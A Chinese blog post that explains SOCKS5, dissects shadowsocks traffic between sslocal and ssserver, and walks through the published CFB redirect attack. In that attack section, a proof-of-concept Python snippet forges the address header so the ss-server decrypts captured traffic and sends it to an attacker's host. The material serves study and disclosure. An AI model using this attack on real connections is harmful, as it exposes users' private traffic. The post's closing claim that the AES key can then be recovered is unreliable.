---
title: shadowsocks的通信原理以及攻击方法分析
url: 818.html
id: 818
categories:
  - 学习记录
date: 2020-02-18 12:01:27
tags:
  - web
  - CTF
  - 加密解密
  - 学习记录
---

发现shadowsocks的通信协议出现了重大的安全问题，比较好奇，学习一下。

<!-- more -->

## 0x1 复习一下socks5 协议

socks5代理协议是一个非常轻量级，简单却实用的代理协议。整个协议其实就是在建立TCP连接之后，在真正的内容传输之前，加一点内容。

通讯中各部分的定义如下：
```
    /-> | Firewall(防火墙) | ->\
Client -> Server(代理服务器) -> Dst(目标地址)
```

### 第一步，Client与Server建立连接

建立TCP连接之后，Client发送如下数据：

```
+----+----------+----------+
|VER | NMETHODS | METHODS  |
+----+----------+----------+
| 1  |    1     | 1 to 255 |
+----+----------+----------+
```
- VER 是指协议版本，因为是 socks5，所以值是 0x05,一个字节
- NMETHODS 是指有多少个可以使用的方法，也就是客户端支持的认证方法，一个字节，有以下值：
    - 0x00 NO AUTHENTICATION REQUIRED 不需要认证
    - 0x01 GSSAPI 参考：https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface
    - 0x02 USERNAME/PASSWORD 用户名密码认证
    - 0x03 to 0x7f IANA ASSIGNED 一般不用。INNA保留。
    - 0x80 to 0xfe RESERVED FOR PRIVATE METHODS 保留作私有用处。
    - 0xFF NO ACCEPTABLE METHODS 不接受任何方法/没有合适的方法
- METHODS 就是方法值，1-255个字节，有多少个方法就有多少个byte


### 第二步，Server返回可以使用的方法

收到Client的请求之后，Server选择一个自己也支持的认证方案，然后返回：

```
+----+--------+
|VER | METHOD |
+----+--------+
| 1  |   1    |
+----+--------+
```

VER 和 METHOD 的取值与上一节相同。

### 第三步，client 向 server 发送 Dst 的地址

```
+----+-----+-------+------+----------+----------+
|VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |
+----+-----+-------+------+----------+----------+
| 1  |  1  | X'00' |  1   | Variable |    2     |
+----+-----+-------+------+----------+----------+
```

- VER 还是版本，取值是 0x05
- CMD 是指要做啥，取值如下：
    - CONNECT 0x01 连接
    - BIND 0x02 端口监听(也就是在Server上监听一个端口)
    - UDP ASSOCIATE 0x03 使用UDP
- RSV 是保留位，值是 0x00
- ATYP 是目标地址类型，有如下取值：
    - 0x01 IPv4
    - 0x03 域名
    - 0x04 IPv6
- DST.ADDR 就是目标地址的值了，如果是IPv4，那么就是4 bytes，如果是IPv6那么就是16 bytes，如果是域名，那么第一个字节代表接下来有多少个字节是表示目标地址
- DST.PORT 两个字节代表端口号

### 第四步，服务端回复

```
+----+-----+-------+------+----------+----------+
|VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
+----+-----+-------+------+----------+----------+
| 1  |  1  | X'00' |  1   | Variable |    2     |
+----+-----+-------+------+----------+----------+
```

- VER 还是版本，值是 0x05
- REP 是状态码，取值如下：
    - 0x00 succeeded
    - 0x01 general SOCKS server failure
    - 0x02 connection not allowed by ruleset
    - 0x03 Network unreachable
    - 0x04 Host unreachable
    - 0x05 Connection refused
    - 0x06 TTL expired
    - 0x07 Command not supported
    - 0x08 Address type not supported
    - 0x09 to 0xff unassigned
- RSV 保留位，取值为 0x00
- ATYP 是目标地址类型，有如下取值：
    - 0x01 IPv4
    - 0x03 域名
    - 0x04 IPv6
- DST.ADDR 就是目标地址的值了，如果是IPv4，那么就是4 bytes，如果是IPv6那么就是16 bytes，如果是域名，那么第一个字节代表接下来有多少个字节是表示目标地址
- DST.PORT 两个字节代表端口号

### 第五步，开始传输流量

接下来就是流量传输了，clinet端将需要发送给dst的流量直接发送给server就可以了。

### server端简单的代码实现

```python

import socket, sys, select, SocketServer, struct, time 

class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass
class Socks5Server(SocketServer.StreamRequestHandler): 
  def handle_tcp(self, sock, remote): 
    fdset = [sock, remote] 
    while True: 
      r, w, e = select.select(fdset, [], []) 
      if sock in r: 
        if remote.send(sock.recv(4096)) <= 0: break
      if remote in r: 
        if sock.send(remote.recv(4096)) <= 0: break
  def handle(self): 
    try: 
      pass # print 'from ', self.client_address nothing to do. 
      sock = self.connection 
      # 1. Version 
      sock.recv(262) 
      sock.send("\x05\x00"); 
      # 2. Request 
      data = self.rfile.read(4) 
      mode = ord(data[1]) 
      addrtype = ord(data[3]) 
      if addrtype == 1:    # IPv4 
        addr = socket.inet_ntoa(self.rfile.read(4)) 
      elif addrtype == 3:   # Domain name 
        addr = self.rfile.read(ord(sock.recv(1)[0])) 
      port = struct.unpack('>H', self.rfile.read(2)) 
      reply = "\x05\x00\x00\x01"
      try: 
        if mode == 1: # 1. Tcp connect 
          remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
          remote.connect((addr, port[0])) 
          pass # print 'To', addr, port[0] nothing do to. 
        else: 
          reply = "\x05\x07\x00\x01" # Command not supported 
        local = remote.getsockname() 
        reply += socket.inet_aton(local[0]) + struct.pack(">H", local[1])
      except socket.error: 
        # Connection refused 
        reply = '\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00'
      sock.send(reply) 
      # 3. Transfering 
      if reply[1] == '\x00': # Success 
        if mode == 1:  # 1. Tcp connect 
          self.handle_tcp(sock, remote) 
    except socket.error: 
      pass #print 'error' nothing to do . 
    except IndexError: 
      pass
def main(): 
  filename = sys.argv[0]; 
  if len(sys.argv)<2: 
    print 'usage: ' + filename + ' port'
    sys.exit() 
  socks_port = int(sys.argv[1]);   
  server = ThreadingTCPServer(('', socks_port), Socks5Server) 
  print 'bind port: %d' % socks_port + ' ok!'
  server.serve_forever() 
if __name__ == '__main__': 
  main()
```

## 0x2 shadowsocks协议

阅读了一下shadowsocks的部分源码并抓包分析了一下通信过程。通过分析发现我对shadowsocks通信是基于socks5协议的这种说法的理解是完全不对的的，下面画一个shadowsocks通信的原理图。

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-14-40.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-14-40.png)

shadowsocks由sslocal和ssserver两部分组成，而真正利用socks5协议进行通信的只有sslocal,sslocal和ssserver之间的通信用的是非常简陋的通信协议，或者说根本就没有用协议。

为了分析协议，shadowsocks的ssserver和sslocal的配置文件分别如下：

```json
{
    "server":"127.0.0.1",  
    "server_port":7878,   
    "password":"password", 
    "timeout":60,          
    "method":"aes-256-cfb" 
}
```

```json
{
    "server":"127.0.0.1",
    "server_port":7878,
    "local_port":1090,
    "password":"password",
    "timeout":600,
    "method":"aes-256-cfb"
}
```
下面结合wireshark抓流量进行分析。

### sslocal与clinet端的通信

sslocal可以分为两个部分，第一个部分是socks5服务端，它负责监听本地的请求。另外一个部分是信息发送端，它负责向远程的ssserver发送数据包。这个节我们只分析 sslocal 作为 socks5 服务器的这一部分。

用`tcp.port==1090` 过滤一下数据包，就会看到 socks5 协议的整个通信过程。

1. 首先是 `client` 端发送请求建立连接的请求，发送的数据是 `05 02 00 01`

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-30-52.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-30-52.png)

2. sslocal的socks5服务器回复 `05 00`,表示不需要认证。

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-33-15.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-33-15.png)

3. clinet发送通信目标的ip和port

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-35-08.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-35-08.png)

4. sslocal的socks5服务器回复 `05 00 00 01 00 00 00 00 10 10`,对比上面的socks5通信协议会知道这里返回的ip是`00 00 00 00`，port 是 `10 10`,这俩都是假的值，因为 sslocal 并没有真实的和client要求的目标地址通信，而是向ssserver发起了请求。
![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-36-03.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-36-03.png)

5. 接下来就是socks5数据传输过程。client段发送自己的请求，我这里是个http请求。

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-41-06.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-41-06.png)

### sslocal与ssserver的通信

#### sslocal发送给ssserver的数据

通过设置filter `tcp.port==7878` 获取 sslocal 发送给 ssserver的第一条数据如下:

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-52-27.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-52-27.png)

因为不知道通信协议的格式，所以并不知道发送了什么数据，不过我们可以先看一下shadowsocks中的数据解密函数:

```python
    def decrypt(self, buf):
        if len(buf) == 0:
            return buf
        if self.decipher is None:
            decipher_iv_len = self._method_info[1]
            decipher_iv = buf[:decipher_iv_len]
            self.decipher = self.get_cipher(self.key, self.method, 0,
                                            iv=decipher_iv)
            buf = buf[decipher_iv_len:]
            if len(buf) == 0:
                return buf
        return self.decipher.update(buf)
```
通过这个函数，知道发送的数据前 `decipher_iv_len` 是加密所用的初始iv的长度，我这里用的加密算法是 `aes-256-cfb`，跟一下代码知道这里 `decipher_iv_len` 是16。

所以 `4222143a3190ce92e4aa8609a7036aeb` 是iv，`db55f138d80414873c3e792896935691dc3769f1ada0c0122c58e8e825298fc2b2a5a9eef3dd6ca2c4204b30c6814b28c0644744272b21d2b9b4a9b0ddfb35e082d82629cea42c87437ca1fabdde735f6c72bc95`是数据，对数据进行解密，得到解密后的数据是`01b7e8e7ac0050474554202f20485454502f312e310d0a486f73743a207777772e62616964752e636f6d0d0a557365722d4167656e743a206375726c2f372e36342e310d0a4163636570743a202a2f2a0d0a0d0a`

转为ascii为：

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-07-41.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-07-41.png)

前面是一段乱码吗，推测可能是通信的某些控制字段，后面跟着就是发送的http请求。

通过阅读shadowsocks的源代码，知道这条数据的格式如下：

```
+-----+-------+-------+------------------+
| 类型 | 目标  |  端口  |     数据          |
+-----+-------+-------+------------------+
| 1   | 变长   |   2   |     变长          |
+-----+-------+-------+------------------+
```

- 类型
  - 0x1 目标部分是 IPV4 地址
  - 0x03 目标部分是域名，是变长字符串，第一个字节表示后面数据的长度。
  - 0x04 目标部分是一个 16 字节的 IPV6 地址

- 数据部分就是用户原始的请求（TCP或UDP数据包部分）


#### ssserver发送给sslocal的数据

ssserver发送给sslocal的数据如下:

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-23-54.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-23-54.png)

根据上面的经验解密之。

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-26-54.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-26-54.png)

发现直接是目标返回的内容，ssserver没有添加任何额外的头部，直接把原始数据返回。

看完这个 shadowsocks 的通信过程，我真是给它跪了，这个通信设计的也太简单粗暴点了吧，数据完整性校验，压缩，签名一概都没有。只把ssloca和sserver之间的通信数据进行加密，通信过程做了iv的随机化，每次发送的数据都会带上本次加密的iv。这一点数据伪装都没做，哎，怪不得被gfw干趴下(可以自己稍微改造改造，加点数据伪装等，尝试过一下...)。


## 0x3 针对shadowsocks的通信的攻击

360公开了对shadowsocks流加密通信过程的攻击文章，https://github.com/edwardz246003/shadowsocks，比较感兴趣，就学习一下。

文中提到的重定向攻击原理也十分简单，但是设计却十分巧妙，感觉其实算是一种重放攻击，下面详细介绍一下这个攻击的原理。

### 复习分组密码CFB模式 

CFB模式的全称是 Cipher FeedBack模式(密文反馈模式)，在CFB模式中前一密文分组会被送到密码算法的输入端，进行下一分组的加密。

加密的流程如下图所示：

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-18-36.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-18-36.png)

相反的解密流程如下所示：

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-19-24.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-19-24.png)

现在只看解密流程，如果我们知道了 `明文分组1` 和 `密文分组1`，接下来就可以通过构造一个`fake_密文分组1`,让ss解密来伪造一个任意的`fake_明文分组1`,原因如下：

首先初始化向量iv加密之后的值，这里记它为 `enc_iv`,那么有如下的等式: 

```
`明文分组1` xor `密文分组1`  = `enc_iv`
`fake_密文分组1` xor `enc_iv` = `fake_明文分组1`
=> 
`enc_iv` xor `fake_明文分组1` = `fake_密文分组1` 
```

通过这样的方式控制 `fake_密文分组1` 就可以构造任意的`fake_明文分组1` 了。

### 漏洞利用过程 

通过上面协议的分析，可以得出 sslocal 发送给 ssserver 的数据格式为：

```
随机IV + encrypt([ 1-byte type][variable-length host][2-byte port][payload])
```
ssserver 发送给 sslocal 的数据格式为：

```
随机IV + encrypt([payload])
```

如果我们拿到了 ssserver 发送给 sslocal 的数据，使用常规的非暴力手段是无法解密的，但是如果我们知道了此数据的前7个字节，那么就可以利用上面介绍的CFB明文伪造攻击将 `fake_明文分组1` 的前7个字节伪造为 `[ 1-byte type][variable-length host][2-byte port]` ,然后把此数据包做为 sslocal 发送给 ssserver 的数据，发给 ssserver。
因为数据 `[ 1-byte type][variable-length host][2-byte port] `的内容可以完全被我们控制，所以将目标地址修改为我们自己的服务器，然后 ssserver 就会把解密完的数据发送到我们自己的服务器上，工作过程如下所示：

```
ss-local(fake one) <--[encrypted]--> ss-remote <---> target(controlled)
```

那关键问题是怎么知道加密数据的前7个字节的明文呢？论文中提供了一种方法，如果用户使用 shadowsocks 进行 http 通信，那么响应的前7个字节是`HTTP/1.`,我们可以利用这7个字节来解密整个数据包。
具体的代码实现如下：

```python
c=c.decode('hex')
#c=up(c)
prefix_http='HTTP/1.'
targetIP='\x01\x27\x6c\x05\x37\x1e\x61' # malicous target IP address: 192.168.1.3:4626
x=xor(prefix_http,targetIP)
 
y=c[16:16+7]
z=xor(x,y)
cipertext=c[0:16]+z+c[16+7:]
import socket
obj = socket.socket()
print ("begin\n")
obj.connect(("127.0.0.1",7878))# ss-server is running on 192.168.1.2:8899
obj.send(cipertext)# send the payload to construct a redirect tunnel
```

因为修改了第一个密文分组，所以解密出来的第二个明文分组是不正确的，如下图所示，有16个字节的错误数据：

![http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-23-56-23.png](http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-23-56-23.png)

因为不知道到底哪个数据包传输的内容是 http 协议，所以需要多试几次，直到解密成功一个为止。 一旦解密成功，就可以知道一段密文分组经过key加密之后的值，就可以反解出key，进而破解所有数据包。


## 参考文章

https://tools.ietf.org/html/rfc1928
https://jiajunhuang.com/articles/2019_06_06-socks5.md.html
https://blog.gfkui.com/2018/04/29/shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html
https://loggerhead.me/posts/shadowsocks-yuan-ma-fen-xi-tcp-dai-li.html
https://github.com/shadowsocks/shadowsocks/tree/master/shadowsocks
https://github.com/edwardz246003/shadowsocks





